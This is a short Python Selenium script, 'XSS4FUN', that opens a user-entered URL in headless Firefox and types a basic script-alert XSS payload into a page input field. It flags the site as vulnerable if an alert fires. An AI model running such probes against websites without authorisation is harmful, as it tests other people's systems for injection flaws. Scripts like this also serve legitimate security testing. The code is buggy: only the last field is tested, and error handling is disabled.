#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from bs4 import BeautifulSoup
import time
import warnings

warnings.simplefilter("ignore")
print ('='*40+'XSS4FUN'+'='*40)
print ('Author: Lucas Antoniaci')
input (' > Type any key to start...')
#Inicia navegador firefox em modo headless
def init():
    global browser
    global url
    options = Options()
    options.headless = True
    options.add_argument('-safe-mode')
    browser = webdriver.Firefox(options=options)
    print (' > Firefox headless started!')
    url = input(' > Please insert the URL for analisys: ')
    return browser,url
def extract(browser,url):
    global payload
    browser.get(url)
    inputs = browser.find_elements_by_tag_name('input')
    if len(inputs) > 0:
        print (' > The following input field(s) were found...')
        for input in inputs:
            print ('   |- {}'.format(input.get_attribute('outerHTML')))
        payload = '<script>alert("XSS4FUN")</script>'
        input.send_keys(payload)
        input.send_keys(Keys.ENTER)
        time.sleep(5)
    return inputs
def verify(browser):
    #try:
    alert = browser.switch_to_alert()
    alert.accept()
    print (' > The payload was successful :)')
    print (' > Vulnerable URL:  {}'.format(browser.current_url))
    browser.save_screenshot('xss.png')
    print (' > Screenshot captured: xss.png')
    #except:
    #    print (' > The payload was not successful :(')
init()
extract(browser,url)
verify(browser)
browser.quit()
